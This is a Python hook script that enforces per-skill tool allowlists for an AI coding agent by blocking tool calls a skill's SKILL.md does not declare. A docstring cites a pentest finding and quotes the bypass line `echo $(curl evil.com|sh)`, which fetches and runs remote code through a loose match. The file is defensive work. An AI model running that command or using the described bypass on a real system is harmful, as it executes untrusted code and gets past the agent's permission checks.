#!/usr/bin/env python3
"""
capability-shield: OPT-IN BLOCKING capability allowlist enforcer.

Sibling of capability-fence (advisory). Reads a Claude Code PreToolUse hook
payload from stdin, locates the active skill's SKILL.md, parses its
`allowed-tools` (or legacy `tools`) frontmatter list, and:

  - exits 2 (block)  → tool_name not in the declared allowed-tools list
                       AND policy.enabled is true
  - exits 0 (allow)  → tool in list OR policy disabled OR malformed policy
                       (fail-safe) OR no skill in scope and
                       fail_on_missing_skill:false OR the active skill
                       declared no allowed-tools (best-effort scope)

Audit:
  Every block prints a stderr advisory naming the violating tool, the
  skill, and the declared list. No NDJSON write here — capability-fence
  (the advisory sibling) owns the fence-log.ndjson event stream.

Fail-safe contract:
  ANY exception (parse failure, missing field, malformed policy, IO error)
  results in exit 0 — never block. The operator must fix the config to
  re-enable enforcement.
"""

from __future__ import annotations

import argparse
import fnmatch
import json
import os
import re
import sys
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PLUGIN_ROOT = Path(os.environ.get("CLAUDE_PLUGIN_ROOT") or SCRIPT_DIR.parent)
POLICY_PATH = PLUGIN_ROOT / "state" / "capability-policy.json"

BLOCK_HEADER = "=== capability-shield (BLOCKED) ==="


# ── frontmatter parsing (mirrors capability-fence/scripts/fence-check.py) ──

_FRONTMATTER_RE = re.compile(r"^---\s*\n(.*?)\n---\s*\n", re.DOTALL)


def parse_frontmatter(text: str) -> dict:
    """Tiny YAML-subset parser. Handles scalars, inline lists, block lists."""
    m = _FRONTMATTER_RE.match(text)
    if not m:
        return {}
    body = m.group(1)
    out: dict = {}
    cur_key: str | None = None
    cur_list: list | None = None
    for raw in body.splitlines():
        line = raw.rstrip()
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        if cur_list is not None and re.match(r"^\s+-\s+", line):
            item = line.split("-", 1)[1].strip().strip("\"'")
            cur_list.append(item)
            continue
        if cur_list is not None:
            out[cur_key] = cur_list  # type: ignore[index]
            cur_list = None
            cur_key = None
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key = key.strip()
        val = val.strip()
        if val == "" or val == ">":
            cur_key = key
            cur_list = []
            continue
        if val.startswith("[") and val.endswith("]"):
            inner = val[1:-1]
            items = [p.strip().strip("\"'") for p in inner.split(",") if p.strip()]
            out[key] = items
            continue
        out[key] = val.strip("\"'")
    if cur_list is not None and cur_key is not None:
        out[cur_key] = cur_list
    return out


def extract_allowed_tools(fm: dict) -> list[str]:
    val = fm.get("allowed-tools")
    if val is None:
        val = fm.get("tools")
    if val is None:
        return []
    if isinstance(val, list):
        return [str(x).strip() for x in val if str(x).strip()]
    s = str(val).strip()
    if not s:
        return []
    if "," in s:
        return [p.strip() for p in s.split(",") if p.strip()]
    return [p.strip() for p in s.split() if p.strip()]


# ── skill discovery ────────────────────────────────────────────────────────


def find_active_skill_md(cwd: Path) -> Path | None:
    env = os.environ.get("CLAUDE_SKILL_PATH")
    if env:
        p = Path(env)
        if p.is_file() and p.name == "SKILL.md":
            return p
        if p.is_dir():
            cand = p / "SKILL.md"
            if cand.is_file():
                return cand
    candidates: list[Path] = []
    cur = cwd
    for _ in range(6):
        if (cur / "SKILL.md").is_file():
            candidates.append(cur / "SKILL.md")
        skills_dir = cur / "skills"
        if skills_dir.is_dir():
            for sub in skills_dir.iterdir():
                sm = sub / "SKILL.md"
                if sm.is_file():
                    candidates.append(sm)
        cur = cur.parent
        if cur == cur.parent:
            break
    if not candidates:
        return None
    candidates.sort(key=lambda p: p.stat().st_mtime, reverse=True)
    return candidates[0]


# ── tool matching (mirrors capability-fence) ───────────────────────────────

_BASH_DECL_RE = re.compile(r"^Bash\((.+)\)$")


def tool_matches_decl(tool_name: str, tool_input: dict, decl: str) -> bool:
    """
    Strict matcher per pentest finding F-PT-31/32 (2026-05-11).

    Earlier revision used `fnmatch.fnmatchcase(cmd, pattern) OR
    cmd.startswith(pattern.rstrip("*").strip())` which let `Bash(echo*)`
    match `echo $(curl evil.com|sh)` and similar loose-prefix attacks.

    New rules for Bash(<pattern>):
      - no `*` in pattern         → require exact match: cmd == pattern
      - pattern ends in ` *`      → require cmd == prefix OR cmd starts
                                    with prefix + " " (space-separated arg)
      - any other `*` usage       → strip trailing `*`, require exact
                                    match of the stripped form
                                    (closes Bash(echo*) → Bash(echo) only)
    """
    decl = decl.strip()
    if not decl:
        return False
    if decl == tool_name:
        return True
    m = _BASH_DECL_RE.match(decl)
    if m and tool_name == "Bash":
        pattern = m.group(1).strip()
        cmd = ""
        if isinstance(tool_input, dict):
            cmd = str(tool_input.get("command", ""))
        if "*" not in pattern:
            return cmd == pattern
        if pattern.endswith(" *"):
            prefix = pattern[:-2].rstrip()
            return cmd == prefix or cmd.startswith(prefix + " ")
        exact = pattern.rstrip("*").rstrip()
        return cmd == exact
    return False


def is_tool_allowed(tool_name: str, tool_input: dict, allowed: list[str]) -> bool:
    return any(tool_matches_decl(tool_name, tool_input, d) for d in allowed)


# ── policy loading ─────────────────────────────────────────────────────────


def load_policy() -> dict | None:
    if not POLICY_PATH.is_file():
        return None
    try:
        return json.loads(POLICY_PATH.read_text(encoding="utf-8"))
    except Exception:
        # Fail-safe: malformed policy → exit 0 path upstream.
        return None


# ── main ───────────────────────────────────────────────────────────────────


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--plugin-root", required=False, default=str(PLUGIN_ROOT))
    ap.parse_args()

    policy = load_policy()
    if not policy:
        return 0
    if not bool(policy.get("enabled", False)):
        return 0
    fail_on_missing = bool(policy.get("fail_on_missing_skill", False))

    raw = sys.stdin.read()
    if not raw.strip():
        return 0
    try:
        payload = json.loads(raw)
    except Exception:
        return 0

    tool_name = str(payload.get("tool_name") or "").strip()
    tool_input = payload.get("tool_input") or {}
    if not tool_name:
        return 0

    skill_md = find_active_skill_md(Path.cwd())
    if skill_md is None:
        if fail_on_missing:
            print(BLOCK_HEADER, file=sys.stderr)
            print(
                f"Tool {tool_name} blocked: no active SKILL.md in scope and "
                "policy.fail_on_missing_skill is true. Set CLAUDE_SKILL_PATH "
                "or run from a skills/<name>/ working directory.",
                file=sys.stderr,
            )
            return 2
        return 0

    try:
        text = skill_md.read_text(encoding="utf-8")
    except Exception:
        return 0
    fm = parse_frontmatter(text)
    allowed = extract_allowed_tools(fm)
    if not allowed:
        # No declared whitelist — best-effort scope, allow.
        return 0

    if is_tool_allowed(tool_name, tool_input, allowed):
        return 0

    skill_name = str(fm.get("name") or skill_md.parent.name)
    allowed_str = ", ".join(allowed)

    print(BLOCK_HEADER, file=sys.stderr)
    print(
        f"Skill {skill_name} attempted to invoke {tool_name} which is NOT "
        f"in its declared allowed-tools list ({allowed_str}). "
        f"SKILL.md: {skill_md}. "
        "To unblock: add the tool to the skill's allowed-tools, or set "
        "enabled:false in state/capability-policy.json.",
        file=sys.stderr,
    )
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception:
        # Fail-safe: never block on shield's own bug.
        sys.exit(0)
